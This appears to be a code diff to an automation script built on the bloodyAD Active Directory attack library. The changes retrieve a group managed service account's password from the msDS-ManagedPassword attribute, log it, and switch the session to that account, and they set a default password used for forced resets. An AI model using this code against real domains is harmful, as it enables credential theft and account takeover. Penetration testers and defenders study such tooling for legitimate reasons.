@@ -1,11 +1,9 @@
-import bloodyAD
-from bloodyAD import utils, ConnectionHandler
+from bloodyAD import ConnectionHandler
 from bloodyAD.cli_modules import add, set, remove, get
 from bloodyAD.exceptions import LOG
-import asyncio
-
+import base64
 # Constant for password changes
-PASSWORD_DEFAULT = "Password123!"
+PASSWORD_DEFAULT = "AutoBl00dy123!"
 
 class Automation:
     def __init__(self, args, path):
@@ -215,12 +213,11 @@ class Automation:
             password_blob = None
             async for entry in get.object(self.conn, target_dn, attr="msDS-ManagedPassword"):
                 if "msDS-ManagedPassword" in entry:
-                    password_blob = entry["msDS-ManagedPassword"]
+                    password_blob = entry["msDS-ManagedPassword"][0]['B64ENCODED']
                     break
             
             if password_blob:
-                LOG.info(f"[+] Retrieved GMSA password (base64): {password_blob}")
-                print(f"[+] GMSA password retrieved (base64): {password_blob}")
+                LOG.debug(f"[+] Retrieved GMSA password (base64): {password_blob}")
                 
                 # Get the sAMAccountName for the GMSA account
                 ldap = await self.conn.getLdap()
@@ -232,9 +229,9 @@ class Automation:
                 if user_entry:
                     user = user_entry["sAMAccountName"]
                     # Use the base64 encoded password directly
-                    pwd = password_blob
-                    LOG.info(f"[+] Switching to GMSA account: {user}")
-                    await self._switchUser(user, pwd)
+                    self.conn.conf.format = "b64"
+                    LOG.debug(f"[+] Switching to GMSA account: {user}")
+                    await self._switchUser(user, password_blob)
                 else:
                     LOG.warning("[!] Could not retrieve sAMAccountName for GMSA account")
             else:
